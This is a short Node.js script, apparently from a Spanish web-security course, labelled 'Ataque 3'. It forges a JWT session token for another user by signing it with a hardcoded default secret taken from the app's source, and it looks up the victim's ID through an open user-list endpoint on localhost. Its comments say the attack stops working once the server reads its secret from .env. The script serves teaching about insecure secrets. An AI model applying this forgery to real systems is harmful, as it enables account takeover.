// Ataque 3: fabricar el token de otro sin saber su clave.
// Desde el paso 6 ya no funciona: el servidor firma con el secreto de .env, no con este.
//   node ataques/fabricar-token.js luis@ua.es
const jwt = require('jsonwebtoken');

// Está escrito en usuarios/sesion.js: lo sabe cualquiera que tenga el código (el ZIP, el repositorio…)
const SECRETO = 'cambia-este-secreto';

const email = process.argv[2] || 'luis@ua.es';

// La lista de usuarios está abierta: de ahí sale el _id de la víctima
fetch('http://localhost:3000/api/usuarios')
  .then(respuesta => respuesta.json())
  .then(usuarios => {
    const victima = usuarios.find(u => u.email === email);
    if (!victima) return console.log(`No hay ningún usuario con el email ${email}`);
    const token = jwt.sign({ sub: victima._id, nombre: victima.nombre }, SECRETO, { expiresIn: '1h' });
    console.log(`Token de ${victima.nombre}, fabricado sin su clave:\n\n${token}\n`);
  });
